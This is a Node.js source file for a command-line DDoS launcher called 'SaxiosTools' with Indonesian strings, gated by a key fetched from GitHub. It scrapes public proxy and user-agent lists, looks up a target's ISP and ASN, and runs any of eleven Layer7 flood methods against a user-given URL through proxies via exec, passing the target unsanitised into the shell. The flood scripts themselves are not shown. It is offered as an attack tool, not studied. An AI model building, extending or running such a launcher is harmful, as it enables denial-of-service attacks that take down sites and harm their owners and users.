#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '1.0.0'
let processList = [];
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
${hijau}[ SYSTEM ]${Reset} Welcome To SaxiosTools
\x1b[31m⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣖⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[31m⠀⠀⠀⠀⢀⣾⡟⣉⣽⣿⢿⡿⣿⣿⣆⠀⠀⠀⠀⠀ ⠀ \x1b[0m
\x1b[31m⠀⠀⠀⢠⣿⣿⣿⡗⠋⠙⡿⣷⢌⣿⣿⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[31m⣷⣄⣀⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[31m⠈⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢀⠀⠀⠀⠀\x1b[0m
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀⠀
| ${biru}Kaze${Reset} 1.0 | ${biru}SaxiosTools${Reset} | 
| t.me/rapidcostum | Owner Kaze
| Tools DDoS | ${biru}Not Plans C2${Reset}
========================================================================
Please Type "${teksmerah}help${Reset}" Or "${teksmerah}methods${Reset}"For Showing All Available Command`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log('\x1b[1m\x1b[38;2;0;0;128mSebentar Kak Lagi Di proses...\x1b[0m');
    
    await exec('npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent');
    
    //paswordnya sigmaboy.txt
const secretBangetJir = await fetch('https://github.com/WhiteXbec/R3X/blob/main/sigma.txt');
const password = await secretBangetJir.text();
    await console.log(`
\x1b[1m\x1b[35m         ██╗  ██╗███████╗██╗   ██╗  \x1b[0m
\x1b[1m\x1b[35m         ██║ ██╔╝██╔════╝╚██╗ ██╔╝ \x1b[0m
\x1b[1m\x1b[35m         █████╔╝ █████╗   ╚████╔╝    \x1b[0m
\x1b[1m\x1b[96m         ██╔═██╗ ██╔══╝    ╚██╔╝      \x1b[0m
\x1b[1m\x1b[96m         ██║  ██╗███████╗   ██║        \x1b[0m
\x1b[1m\x1b[96m         ╚═╝  ╚═╝╚══════╝   ╚═╝        \x1b[0m
`)
    permen.question(`\x1b[1m\x1b[31mEnter Key Before Join CNC\x1b[0m : `, async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`\x1b[1m\x1b[36mPASSWORD BENAR SEMOGA ANDA TENANG\x1b[0m`);
        await scrapeProxy();
        console.log(`\x1b[31m▓▓▓▓▓▓▓\x1b[0m░░░ 70%`);
        await scrapeUserAgent();
        console.log(`\x1b[31m▓▓▓▓▓▓▓▓▓▓\x1b[0m 100%`);
        await sleep(700);
        console.clear();
        console.log(`[...] Establishing Connection to Server Please Wait In a Moment`);
        await sleep(1000);
      await banner();
        console.log(``);
        sigma();
      } else {
        console.log(`Wrong Key`);
        process.exit(-1);
      }
    }) 
    
  } catch (error) {
    console.log(`Are You Online?`);
  }
}
// [========================================] //
async function pushMonitor(methods, target, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\nMonitor Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <methods> <url> <duration>
attack flood https://google.com 120`);
    sigma();
	return
  }
const [methods, target, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;


console.clear()
console.log(`
${hijau}[ SYSTEM ]${Reset} ${bold}ATTACK SUCCESFULLY SENT${Reset}

\x1b[1m\x1b[38;5;20m╔═══════════════════════════════════════════════════════════╗\x1b[0m
  ${bold}Attack Details${Reset}
      ${bold}Status${Reset}   : [ \x1b[1m\x1b[32mAttack Sent Successfully All Server\x1b[0m ]
      ${bold}Host${Reset}     : [ \x1b[1m\x1b[36m${target}\x1b[0m ]
      ${bold}Port${Reset}     : [ \x1b[1m\x1b[36m443\x1b[0m ]
      ${bold}Time${Reset}     : [ \x1b[1m\x1b[36m${duration}\x1b[0m ]
      ${bold}Method${Reset}   : [ \x1b[1m\x1b[36m${methods}\x1b[0m ]
\x1b[1m\x1b[38;5;20m╚═══════════════════════════════════════════════════════════╝\x1b[0m
\x1b[1m\x1b[38;5;20m╔═══════════════════════════════════════════════════════════╗\x1b[0m
      ${bold}ASN${Reset}      : [ \x1b[1m\x1b[36m${result.as}\x1b[0m ]
      ${bold}ISP${Reset}      : [ \x1b[1m\x1b[36m${result.isp}\x1b[0m ]
      ${bold}IP${Reset}       : [ \x1b[1m\x1b[36m${result.query}\x1b[0m ]
\x1b[1m\x1b[38;5;20m╚═══════════════════════════════════════════════════════════╝\x1b[0m
Please After Attack Type "\x1b[1m\x1b[35mcls\x1b[0m" To Return To The Home
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'nuke') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'tlsv2') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'hold') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'bypass') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'tlsv2') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'r2') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'pidoras') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'pluto') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'https') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'tls') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function sigma() {
const creatorCredits = `
Created And Coded Full By Keza

Thx To:
Allah SWT
Keza ( Owner Methods )
ChatGPT ( Fixing Error )
PermenMD ( Provide Base Script )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
`

permen.question(`${back_putih}${biru}Keza-DDoS${Reset}➔ ${back_putih}${biru}Console${Reset} ${back_putih}${biru}►${Reset} `, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
ATTACK  | Launch DDoS Attack
CREDITS │ Show Creator Of These Tools
CLS     │ Clear Terminal
METHODS │ Show Methods
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
NAME       │ DESCRIPTION                   │ DURATION
___________│_______________________________│____________
TLS        │ Layer7 - Attack Url           │ Unlimited 
BYPASS     │ Layer7 - Attack Url           │ Unlimited 
HOLD       │ Layer7 - Attack Url           │ Unlimited 
TLSV2      │ Layer7 - Attack Url           │ Unlimited 
HTTPS      │ Layer7 - Attack Url           │ Unlimited 
PLUTO      │ Layer7 - Attack Url           │ Unlimited 
NUKE       │ Layer7 - Attack Url           │ Unlimited 
PIDORAS    │ Layer7 - Attack Url           │ Unlimited
RAW        │ Layer7 - Attack Url           │ Unlimited
R2         │ Layer7 - Attack Url           │ Unlimited
CLS        │ Clear Terminal                │ 0
ATTACK     │ Launch DDoS Attack            │ 0
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'cls') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
